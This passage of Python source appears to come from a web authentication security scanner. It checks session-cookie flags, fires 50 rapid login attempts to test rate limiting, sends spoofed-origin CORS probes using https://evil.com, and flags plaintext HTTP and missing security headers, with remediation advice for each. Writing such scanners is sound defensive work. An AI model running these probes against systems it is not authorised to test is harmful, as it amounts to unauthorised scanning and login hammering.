    # 18d: Missing session expiry headers
    for check_path in ["/", "/api/v1/me"]:
        url = base_url.rstrip("/") + check_path
        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
        resp_headers = resp.get("headers", {})
        set_cookie = resp_headers.get("set-cookie", "")
        if set_cookie:
            sc_lower = set_cookie.lower()
            has_http_only = "httponly" in sc_lower
            has_secure = "secure" in sc_lower
            has_samesite = "samesite" in sc_lower
            has_max_age = "max-age" in sc_lower
            has_expires = "expires" in sc_lower

            issues = []
            if not has_http_only:
                issues.append("missing HttpOnly")
            if not has_secure:
                issues.append("missing Secure")
            if not has_samesite:
                issues.append("missing SameSite")
            if not has_max_age and not has_expires:
                issues.append("no expiry (Max-Age/Expires)")

            if issues:
                add(
                    f"Insecure session cookie attributes: {check_path}",
                    "medium",
                    f"Session cookie on {check_path} has: {', '.join(issues)}. "
                    f"Full Set-Cookie: {set_cookie[:100]}",
                    f"Set-Cookie issues: {', '.join(issues)}",
                    8,
                    remediation="Set HttpOnly, Secure, and SameSite=Strict/Lax on all session cookies. "
                                "Set appropriate Max-Age or Expires values."
                )
            break

    # ─── Technique 19: Rate Limiting Deep ───────────────────────────────
    _rate_limit_paths = ["/api/v1/auth/login", "/login", "/api/v1/login",
                         "/api/v1/auth/token", "/api/v1/auth"]
    for rl_path in _rate_limit_paths:
        url = base_url.rstrip("/") + rl_path

        # 19a: Send 50 rapid requests and observe behavior
        _statuses: List[int] = []
        _times: List[float] = []
        _rate_limit_headers_found: Dict[str, str] = {}
        _got_429 = False

        for i in range(50):
            t0 = time.monotonic()
            resp = http_probe(url, method="POST",
                              headers={"Content-Type": "application/json"},
                              body=json.dumps({"username": "ratelimit_test", "password": f"attempt_{i}"}).encode(),
                              timeout=max(timeout, 5), verify_tls=verify_tls)
            elapsed = time.monotonic() - t0
            _statuses.append(resp.get("status", 0))
            _times.append(elapsed)

            resp_headers = resp.get("headers", {})
            for rh_key in ["x-ratelimit-limit", "x-ratelimit-remaining",
                           "x-ratelimit-reset", "retry-after",
                           "x-rate-limit-limit", "x-rate-limit-remaining"]:
                if rh_key in resp_headers and rh_key not in _rate_limit_headers_found:
                    _rate_limit_headers_found[rh_key] = resp_headers[rh_key]

            if resp.get("status") == 429:
                _got_429 = True
                break  # Rate limit detected, stop hammering

        # Analyze results
        if _got_429:
            retry_after = _rate_limit_headers_found.get("retry-after", "not set")
            add(
                f"Rate limiting detected: {rl_path}",
                "info",
                f"Endpoint {rl_path} returned 429 after rate limit threshold. "
                f"Retry-After: {retry_after}. "
                f"Rate limit headers found: {list(_rate_limit_headers_found.keys())}",
                f"429 returned after {len(_statuses)} requests. Headers: {_rate_limit_headers_found}",
                0,
                remediation="",
            )
        else:
            # Check if all 50 requests returned the same status (no rate limiting)
            unique_statuses = set(_statuses)
            if len(unique_statuses) <= 2 and 429 not in unique_statuses:
                # Check response time degradation
                avg_first_10 = sum(_times[:10]) / 10 if _times else 0
                avg_last_10 = sum(_times[-10:]) / 10 if _times else 0
                time_degradation = avg_last_10 - avg_first_10

                add(
                    f"No rate limiting: {rl_path} (50 requests)",
                    "high",
                    f"Sent 50 rapid POST requests to {rl_path}. "
                    f"No 429 returned. Statuses: {unique_statuses}. "
                    f"Avg response time: first 10={avg_first_10:.2f}s, last 10={avg_last_10:.2f}s. "
                    f"Time degradation: {time_degradation:+.2f}s.",
                    f"50 requests -> no 429. Statuses: {list(unique_statuses)[:5]}",
                    10,
                    remediation="Implement rate limiting on authentication endpoints. "
                                "Return 429 with Retry-After header when threshold is exceeded. "
                                "Include X-RateLimit-Limit and X-RateLimit-Remaining headers."
                )
                break

    # ─── Technique 20: Insufficient transport security on auth endpoints ─
    if base_url.startswith("http://"):
        add(
            "Authentication over plaintext HTTP",
            "high",
            f"Target base URL uses HTTP (not HTTPS). Authentication credentials transmitted in cleartext.",
            f"Base URL: {base_url}",
            15,
            remediation="Enforce HTTPS for all authentication-related endpoints. "
                        "Set HSTS headers. Redirect all HTTP to HTTPS."
        )

    # ─── Technique 21: CORS misconfiguration on auth endpoints ───────────
    _cors_paths = ["/api/v1/me", "/api/v1/login", "/oauth/authorize"]
    for cors_path in _cors_paths:
        url = base_url.rstrip("/") + cors_path
        resp = http_probe(url, headers={"Origin": "https://evil.com"},
                          timeout=timeout, verify_tls=verify_tls)
        resp_headers = resp.get("headers", {})
        allow_origin = resp_headers.get("access-control-allow-origin", "")
        allow_cred = resp_headers.get("access-control-allow-credentials", "")
        if "evil.com" in allow_origin:
            severity = "high" if allow_cred.lower() == "true" else "medium"
            add(
                f"CORS allows arbitrary origin: {cors_path}",
                severity,
                f"Endpoint {cors_path} reflects arbitrary Origin (https://evil.com) in "
                f"Access-Control-Allow-Origin. Credentials allowed: {allow_cred}.",
                f" ACAO: {allow_origin}, ACAC: {allow_cred}",
                12 if severity == "high" else 6,
                remediation="Never reflect arbitrary Origin values. "
                            "Use a strict allowlist of trusted origins. "
                            "Never combine Access-Control-Allow-Origin: * with Allow-Credentials: true."
            )
            break

    # ─── Technique 22: Security headers missing on auth endpoints ────────
    _sec_check_path = base_url.rstrip("/") + "/api/v1/me"
    sec_resp = http_probe(_sec_check_path, timeout=timeout, verify_tls=verify_tls)
    sec_headers = sec_resp.get("headers", {})
    _missing_headers = []
    for hdr in ["x-frame-options", "x-content-type-options", "x-xss-protection",
                "strict-transport-security", "content-security-policy",
                "cache-control", "pragma"]:
        if hdr not in {k.lower() for k in sec_headers}:
            _missing_headers.append(hdr)
    if _missing_headers:
        add(
            f"Missing security headers: {', '.join(_missing_headers[:4])}",
            "low",
            f"Auth endpoint missing recommended security headers: {', '.join(_missing_headers)}",
            f"Missing: {', '.join(_missing_headers)}",
            3,
            remediation="Add X-Frame-Options (DENY/SAMEORIGIN), X-Content-Type-Options (nosniff), "
                        "Strict-Transport-Security, Content-Security-Policy, and Cache-Control (no-store) "
                        "to all authentication endpoints."
        )

    return findings
